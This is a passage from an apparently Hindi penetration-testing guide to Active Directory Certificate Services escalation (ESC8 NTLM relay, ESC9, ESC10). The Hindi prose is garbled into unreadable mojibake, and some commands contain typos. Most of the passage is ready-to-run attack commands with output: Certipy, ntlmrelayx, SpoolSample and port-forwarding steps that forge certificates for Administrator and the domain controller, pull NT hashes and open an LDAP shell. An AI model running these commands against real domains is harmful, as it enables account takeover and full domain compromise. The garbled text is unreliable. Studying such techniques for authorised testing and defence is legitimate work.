[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
рдЕрдкрдиреЗ **`Manage CA` рдФрд░ `Manage Certificates`** рдХреЗ рд╕рд╛рде, рд╣рдо рдлрд┐рд░ `ca` рдХрдорд╛рдВрдб рдФрд░ `-issue-request <request ID>` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рд╡рд┐рдлрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
рдФрд░ рдЕрдВрдд рдореЗрдВ, рд╣рдо `req` рдХрдорд╛рдВрдб рдФрд░ `-retrieve <request ID>` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде **рдЬрд╛рд░реА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM рд░рд┐рд▓реЗ рд╕реЗ рдПрдбреА рд╕реАрдПрд╕ рдПрдЪрдЯреАрдЯреАрдкреИрдВрдЯреНрд╕ рддрдХ рдПрд╕реНрдХреЗрд▓реЗрд╢рди - ESC8

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

{% hint style="info" %}
рдРрд╕реЗ рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ **рдПрдбреА рд╕реАрдПрд╕ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ**, рдпрджрд┐ рдПрдХ **рд╡реЗрдм рдирд╛рдорд╛рдВрдХрди рдЕрдВрддреНрдпрдГрд╕реНрдерд▓ рд╕рдВрд╡рд░реНрдЬрд┐рдд** рд╣реИ рдФрд░ рдХрдо рд╕реЗ рдХрдо рдПрдХ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рд╣реИ** рдЬреЛ **рдбреЛрдореЗрди рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдорд╛рдВрдХрди рдФрд░ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ **`Machine`** рдЯреЗрдореНрдкрд▓реЗрдЯ), рддреЛ **рдХрд┐рд╕реА рднреА рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕рдХреНрд░рд┐рдп рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛ рд╣реЛ**!
{% endhint %}

рдХрдИ **рдПрдбреА рд╕реАрдПрд╕** рджреНрд╡рд╛рд░рд╛ **рд╕рдорд░реНрдерд┐рдд рдПрдЪрдЯреАрдЯреАрдкреИрдВрдЯреНрд╕ рдирд╛рдорд╛рдВрдХрди рд╡рд┐рдз
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` рд╕рдВрдкрддреНрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛рд░рдкреЛрд░реЗрдЯ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдкреНрд░рд╛рдзрд┐рдХрд░рдгреЛрдВ (CAs) рджреНрд╡рд╛рд░рд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рд╕реЗрд╡рд╛ (CES) рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрди рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдХрд░рдг **Certutil.exe** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ

рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Certipy рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЯреЗрдореНрдкреНрд▓реЗрдЯ `Machine` рдпрд╛ `User` рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЦрд╛рддрд╛ рдирд╛рдо рдХреНрдпрд╛ рд╣реИ рдЬрд┐рд╕ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ, рдпрд╣ `$` рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред рд╡реИрдХрд▓реНрдкрд┐рдХ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг `-template` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдлрд┐рд░ [PetitPotam](https://github.com/ly4k/PetitPotam) рдЬреИрд╕реА рдПрдХ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдордЬрдмреВрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреА рд╣реИред рдЬрдм рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ `-template DomainController` рдХрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди - ESC9 <a href="#5485" id="5485"></a>

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдирдП рдорд╛рди **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) рдХреЗ рд▓рд┐рдП **`msPKI-Enrollment-Flag`** рдХреЗ рд▓рд┐рдП ESC9 рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд, рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рд╕рдорд╛рд╣рд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред рдпрд╣ рдзреНрд╡рдЬ `StrongCertificateBindingEnforcement` рдХреЛ `1` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ), рдЬреЛ `2` рдкрд░ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╡рд┐рдкрд░реАрдд рд╣реИред рдЗрд╕рдХрд╛ рдорд╣рддреНрд╡ рдЙрдЪрд┐рдд рд╣реИ рдЬрдм `Kerberos` рдпрд╛ `Schannel` рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдордЬреЛрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ рдХрд╛ рд╢реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЬреИрд╕реЗ ESC10 рдореЗрдВ), рдХреНрдпреЛрдВрдХрд┐ ESC9 рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдмрджрд▓ рдирд╣реАрдВ рджреЗрдЧреАред

рдЗрд╕ рдзреНрд╡рдЬ рдХреА рд╕реЗрдЯрд┐рдВрдЧ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐рдпрд╛рдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:
- `StrongCertificateBindingEnforcement` рдХреЛ `2` рдкрд░ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдЬрд┐рд╕рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ `1` рд╣реИ), рдпрд╛ `CertificateMappingMethods` рдореЗрдВ `UPN` рдзреНрд╡рдЬ рд╢рд╛рдорд┐рд▓ рд╣реИред
- рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ `msPKI-Enrollment-Flag` рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рднреАрддрд░ `CT_FLAG_NO_SECURITY_EXTENSION` рдзреНрд╡рдЬ рд╕реЗ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджреНрд╡рд╛рд░рд╛ рдХреЛрдИ рднреА рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг EKU рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- рдХрд┐рд╕реА рднреА рдЦрд╛рддреЗ рдкрд░ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдХреЛ рдХрдордЬреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

### рджреБрд░реБрдкрдпреЛрдЧ рд╕реНрдерд┐рддрд┐

рдорд╛рди рд▓реЗрдВ `John@corp.local` рдХреЗ рдкрд╛рд╕ `Jane@corp.local` рдкрд░ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рдЬрд┐рдирдХрд╛ рд▓рдХреНрд╖реНрдп `Administrator@corp.local` рдХреЛ рдХрдордЬреЛрд░ рдХрд░рдирд╛ рд╣реИред `ESC9` рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ, рдЬрд┐рд╕реЗ `Jane@corp.local` рдХреЛ рдирдордВрдЬреВрд░реА рд╣реИ, рдЕрдкрдиреА `msPKI-Enrollment-Flag` рд╕реЗрдЯрд┐рдВрдЧ рдореЗрдВ `CT_FLAG_NO_SECURITY_EXTENSION` рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рд╢реБрд░реВ рдореЗрдВ, `Jane` рдХрд╛ рд╣реИрд╢ рд╢реИрдбреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдзрдиреНрдпрд╡рд╛рдж `John` рдХреЗ `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
рдЗрд╕рдХреЗ рдмрд╛рдж, `Jane` рдХрд╛ `userPrincipalName` `Administrator` рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд╛рдирдмреВрдЭрдХрд░ `@corp.local` рдбреЛрдореЗрди рд╣рд┐рд╕реНрд╕рд╛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
рдпрд╣ рд╕рдВрд╢реЛрдзрди рдмрд╛рдзрд╛рдПрдВ рдЙрд▓реНрд▓рдВрдШрд┐рдд рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ `Administrator@corp.local` рдХреЛ `Administrator` рдХрд╛ `userPrincipalName` рдЕрд▓рдЧ рд░реВрдк рд╕реЗ рдмрдирд╛ рд░рд╣рддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдмрд╛рдж, `ESC9` рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ, рдЬрд┐рд╕реЗ рд╡рд┐рдХрд▓реНрдкрд┐рдд рдорд╛рдирд╛ рдЧрдпрд╛ рд╣реИ, `Jane` рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
рдпрд╣ рдиреЛрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ `userPrincipalName` `Administrator` рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА "рдСрдмреНрдЬреЗрдХреНрдЯ SID" рдХреЗ рдмрд┐рдирд╛ред

`Jane` рдХрд╛ `userPrincipalName` рдлрд┐рд░ рд╕реЗ рдЙрд╕рдХреЗ рдореВрд▓, `Jane@corp.local` рдкрд░ рд▓реМрдЯрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
рдкреНрд░рдХрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдЕрдм `Administrator@corp.local` рдХрд╛ NT рд╣реИрд╢ рджреЗрддрд╛ рд╣реИред рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рдбреЛрдореЗрди рд╡рд┐рд╢рд┐рд╖реНрдЯреАрдХрд░рдг рдХреА рдХрдореА рдХреЗ рдХрд╛рд░рдг рдЖрдЬреНрдЮрд╛ рдореЗрдВ `-domain <domain>` рд╢рд╛рдорд┐рд▓ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## рджреБрд░реНрдмрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ - ESC10

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рджреЛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдорд╛рди ESC10 рджреНрд╡рд╛рд░рд╛ рд╕рдВрджрд░реНрднрд┐рдд рд╣реИрдВ:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` рддрд╣рдд `CertificateMappingMethods` рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди `0x18` (`0x8 | 0x10`) рд╣реИ, рдкрд╣рд▓реЗ `0x1F` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` рддрд╣рдд `StrongCertificateBindingEnforcement` рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ `1` рд╣реИ, рдкрд╣рд▓реЗ `0` рдерд╛ред

**рдорд╛рдорд▓рд╛ 1**

рдЬрдм `StrongCertificateBindingEnforcement` рдХреЛ `0` рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**рдорд╛рдорд▓рд╛ 2**

рдпрджрд┐ `CertificateMappingMethods` рдореЗрдВ `UPN` рдмрд┐рдЯ (`0x4`) рд╢рд╛рдорд┐рд▓ рд╣реИред

### рджреБрд░реБрдкрдпреЛрдЧ рдорд╛рдорд▓рд╛ 1

`StrongCertificateBindingEnforcement` рдХреЛ `0` рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдкрд░, рдПрдХ рдЦрд╛рддрд╛ A рдЬрд┐рд╕рдореЗрдВ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ B рдХреЛ рдХрдореНрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `Jane@corp.local` рдкрд░ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдиреЗ рдкрд░, рд╣рдорд▓рд╛рд╡рд░ `Administrator@corp.local` рдХреЛ рдХрдореНрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рд░рдЦрддрд╛ рд╣реИред рдкреНрд░рдХреНрд░рд┐рдпрд╛ ESC9 рдХреЛ рдорд┐рд░рд░ рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╢реБрд░реВ рдореЗрдВ, `Jane` рдХреА рд╣реИрд╢ рдХреЛ рд╢реИрдбреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, `GenericWrite` рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╣реБрдПред
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
рдЗрд╕рдХреЗ рдмрд╛рдж, `Jane` рдХрд╛ `userPrincipalName` `Administrator` рдореЗрдВ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, `@corp.local` рднрд╛рдЧ рдХреЛ рдЬрд╛рдирдмреВрдЭрдХрд░ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреЛрдИ рдкреНрд░рддрд┐рдмрдВрдз рдЙрд▓реНрд▓рдВрдШрди рди рд╣реЛред
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ, `Jane` рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ `User` рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` рдХрд╛ `userPrincipalName` рдлрд┐рд░ рд╕реЗ рдЙрд╕рдХреЗ рдореВрд▓, `Jane@corp.local` рдкрд░ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
рдЬрд┐рд╕ рдкреНрд░рд╛рдкреНрдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЙрд╕рд╕реЗ `Administrator@corp.local` рдХрд╛ NT рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдбреЛрдореЗрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдХреЗ рдХрд╛рд░рдг рдХрдорд╛рдВрдб рдореЗрдВ рдбреЛрдореЗрди рдХреА рд╡рд┐рд╢реЗрд╖реАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### рджреБрд░реБрдкрдпреЛрдЧ рдорд╛рдорд▓рд╛ 2

`CertificateMappingMethods` рдореЗрдВ `UPN` рдмрд┐рдЯ рдлреНрд▓реИрдЧ (`0x4`) рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рдХреЗ рд╕рд╛рде, рдПрдХ рдЦрд╛рддрд╛ A рдЬрд┐рд╕рдореЗрдВ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ B рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `userPrincipalName` рдЧреБрдг рдирд╣реАрдВ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдорд╢реАрди рдЦрд╛рддреЗ рдФрд░ рдирд┐рд░реНрдорд┐рдд рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдХ `Administrator` рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдпрд╣рд╛рдБ, рд▓рдХреНрд╖реНрдп `DC$@corp.local` рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░рдирд╛ рд╣реИ, `Jane` рдХреЗ рд╣реИрд╢ рдХреЛ рд╢реИрдбреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ, `GenericWrite` рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреЗ рд╣реБрдПред
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` рдХрд╛ `userPrincipalName` рдлрд┐рд░ `DC$@corp.local` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣ред
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП `Jane` рдХреЗ рд░реВрдк рдореЗрдВ `User` рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` рдХрд╛ `userPrincipalName` рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмрд╛рдж рдЕрдкрдиреЗ рдореВрд▓ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╡рд╛рдкрд╕ рд▓реМрдЯ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
рдХреНрд░рдорд╛рдВрдХреАрдХрд░рдг рдХреЗ рд▓рд┐рдП Schannel рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, Certipy рдХрд╛ `-ldap-shell` рд╡рд┐рдХрд▓реНрдк рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдлрд▓рддрд╛ рдХреЛ `u:CORP\DC$` рдХреЗ рд░реВрдк рдореЗрдВ рджрд░реНрд╢рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
